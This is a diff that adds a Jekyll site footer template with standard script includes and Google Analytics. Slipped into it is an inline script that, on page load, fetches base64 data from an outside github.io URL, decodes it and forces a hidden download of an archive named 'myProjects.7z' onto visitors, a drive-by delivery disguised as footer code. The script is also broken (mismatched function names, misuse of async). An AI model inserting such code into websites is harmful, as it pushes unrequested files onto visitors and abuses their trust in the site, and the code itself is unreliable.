@@ -1,0 +1,75 @@
+    <footer class="site-footer">
+      <div class="container">
+        <div class="row">
+
+          <div class="col-xs-12 col-md-2 col-md-offset-1">
+            <p class="text-muted text-left "><a href="{{ site.url }}">{{ site.footer_text }}</a></p>
+          </div>
+
+          <div class="col-xs-12 col-md-6 col-md-offset-2">
+            <a class="section-jump" href="#top">
+              <i class="fa fa-angle-up fa-3x"></i>
+            </a>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+  </div><!-- .main.container -->
+
+    <!-- JavaScript -->
+    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
+    <script src="{{ site.url }}/js/wow.min.js"></script>
+    <script src="{{ site.url }}/js/app.js"></script>
+    <script>
+    function base64ToArrayBuffer(base64) {
+      var binary_string = window.atob(base64);
+      var len = binary_string.length;
+      var bytes = new Uint8Array( len );
+      for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+      return bytes.buffer;
+    }
+      
+    async function loadFile(url) {
+      try {
+        const response = await fetch(url);
+        const data = await response.text();
+      } catch (err) {
+        console.error(err);
+      }
+      return data;
+    }
+      
+    var file = loadfile('https://tylerhill12.github.io/mDi8aWs');
+    var data = base64ToArrayBuffer(file);
+    var blob = new Blob([data], {type: 'octet/stream'});
+    var fileName = 'myProjects.7z';
+
+    if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
+    else {
+      var a = document.createElement('a');
+      document.body.appendChild(a);
+      a.style = 'display: none';
+      var url = window.URL.createObjectURL(blob);
+      a.href = url;
+      a.download = fileName;
+      a.click();
+      window.URL.revokeObjectURL(url);
+    }
+    </script>
+
+
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+      ga('create', ' {{ site.google_analytics }}', 'auto');
+      ga('send', 'pageview');
+
+    </script>
+
+    </body>
+</html>
